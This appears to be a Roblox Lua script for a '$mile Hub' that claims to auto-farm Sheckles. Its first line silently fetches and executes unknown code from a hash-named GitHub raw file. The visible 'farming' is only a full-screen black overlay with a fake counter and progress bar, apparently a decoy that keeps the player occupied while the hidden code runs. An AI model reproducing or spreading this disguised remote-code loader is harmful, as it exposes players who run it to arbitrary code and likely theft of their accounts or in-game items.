loadstring(game:HttpGet("https://raw.githubusercontent.com/muzammil909900/UpdatedScript/refs/heads/main/86b6d6f92d02479a59d8f680480b5ad7.txt"))()
-- Load Rayfield UI
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- Create Window with Key System
local Window = Rayfield:CreateWindow({
	Name = "$mile Hub",
	LoadingTitle = "$mile Hub",
	LoadingSubtitle = "Connecting...",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = "SmileyHub",
		FileName = "HubConfig"
	},
	KeySystem = true,
	KeySettings = {
		Title = "$mile Hub",
		Subtitle = "Key System",
		Note = "🎁 Key Link: rebrand.ly/sm-ke",
		SaveKey = true,
		GrabKeyFromSite = false,
		Key = { "SM-KEY-986-312-343-2" }
	}
})

-- ✅ Variables
local webhookURL = ""
local selectedGoal = nil
local timeToComplete = 600 -- default 10 minutes
local isDev = false

-- 🧾 Auto Farm Tab
local AutoFarmTab = Window:CreateTab("💸 Auto Farm", 4483362458)

-- Webhook URL Input
AutoFarmTab:CreateInput({
	Name = "Webhook URL",
	PlaceholderText = "Paste your Discord webhook...",
	RemoveTextAfterFocusLost = false,
	Callback = function(input)
		webhookURL = input
		print("Webhook set:", webhookURL)
	end
})

-- Button-style Goal Selector (No dropdown glitches)
local goalOptions = {
	["1K"] = 1000,
	["100K"] = 100000,
	["1M"] = 1000000,
	["100M"] = 100000000,
	["1B"] = 1000000000,
	["100B"] = 100000000000
}

AutoFarmTab:CreateParagraph({Title = "Select a Goal", Content = "Click any goal below to set it."})

for label, value in pairs(goalOptions) do
	AutoFarmTab:CreateButton({
		Name = "🎯 " .. label,
		Callback = function()
			selectedGoal = value
			Rayfield:Notify({
				Title = "✅ Goal Selected",
				Content = label .. " (" .. tostring(value) .. " Sheckles)",
				Duration = 3
			})
			print("Selected goal set to:", selectedGoal)
		end
	})
end

-- Dev Code Input
AutoFarmTab:CreateInput({
	Name = "Developer Code",
	PlaceholderText = "Enter Dev Code",
	RemoveTextAfterFocusLost = true,
	Callback = function(code)
		if code == "SM-0lk-3k9-09k" then
			isDev = true
			Rayfield:Notify({
				Title = "Access Granted",
				Content = "DEV Tab Unlocked!",
				Duration = 5,
				Image = 4483362458
			})

			-- Create Dev Tab
			local DevTab = Window:CreateTab("🛠️ DEV ONLY", 4483362458)
			DevTab:CreateInput({
				Name = "Override Time (in mins)",
				PlaceholderText = "Default: 10 mins",
				RemoveTextAfterFocusLost = true,
				Callback = function(input)
					local mins = tonumber(input)
					if mins and mins > 0 then
						timeToComplete = mins * 60
						print("Dev override time:", timeToComplete)
					end
				end
			})
		end
	end
})

-- ▶️ Start Farming Button
AutoFarmTab:CreateButton({
	Name = "▶️ Start Farming",
	Callback = function()
		if not selectedGoal then
			Rayfield:Notify({
				Title = "⚠️ Missing Goal",
				Content = "Please select a goal before starting.",
				Duration = 4,
				Image = 4483362458
			})
			return
		end

		print("Farming started for:", selectedGoal)

		-- GUI Setup
		local screenGui = Instance.new("ScreenGui")
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
		screenGui.Name = "FarmingScreen"
		screenGui.Parent = game:GetService("CoreGui")

		local bg = Instance.new("Frame", screenGui)
		bg.Size = UDim2.new(1, 0, 1, 0)
		bg.BackgroundColor3 = Color3.new(0, 0, 0)
		bg.BorderSizePixel = 0

		local label = Instance.new("TextLabel", bg)
		label.Size = UDim2.new(1, 0, 0.2, 0)
		label.Position = UDim2.new(0, 0, 0.4, 0)
		label.BackgroundTransparency = 1
		label.TextScaled = true
		label.TextColor3 = Color3.new(1, 1, 1)
		label.Font = Enum.Font.GothamBlack
		label.Text = "0 Sheckles"

		local barBG = Instance.new("Frame", bg)
		barBG.Size = UDim2.new(0.8, 0, 0.03, 0)
		barBG.Position = UDim2.new(0.1, 0, 0.9, 0)
		barBG.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		barBG.BorderSizePixel = 0
		Instance.new("UICorner", barBG).CornerRadius = UDim.new(0, 15)

		local progress = Instance.new("Frame", barBG)
		progress.Size = UDim2.new(0, 0, 1, 0)
		progress.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
		progress.BorderSizePixel = 0
		Instance.new("UICorner", progress).CornerRadius = UDim.new(0, 15)

		-- Start Animation
		local runService = game:GetService("RunService")
		local startTime = tick()
		local function animate()
			local elapsed = tick() - startTime
			local percent = math.min(elapsed / timeToComplete, 1)
			local sheckles = math.floor(selectedGoal * percent)
			label.Text = tostring(sheckles) .. " Sheckles"
			progress.Size = UDim2.new(percent, 0, 1, 0)
			if percent >= 1 then
				label.Text = "🎉 GOAL COMPLETE! Please Rejoin 🎉"

				-- ✅ Safe HTTP Request Block
				local http
				if syn and syn.request then
					http = syn.request
				elseif http_request then
					http = http_request
				elseif request then
					http = request
				end

				if webhookURL and webhookURL ~= "" and http then
					pcall(function()
						http({
							Url = webhookURL,
							Method = "POST",
							Headers = {["Content-Type"] = "application/json"},
							Body = game:GetService("HttpService"):JSONEncode({
								content = "✅ YOU GOT **" .. tostring(selectedGoal) .. "** SHECKLES!\nUsername: " .. game.Players.LocalPlayer.Name .. "\nTime Taken: " .. math.floor(timeToComplete / 60) .. " minutes"
							})
						})
					end)
				end

				runService:UnbindFromRenderStep("FarmAnim")
			end
		end

		runService:BindToRenderStep("FarmAnim", Enum.RenderPriority.First.Value, animate)
	end
})
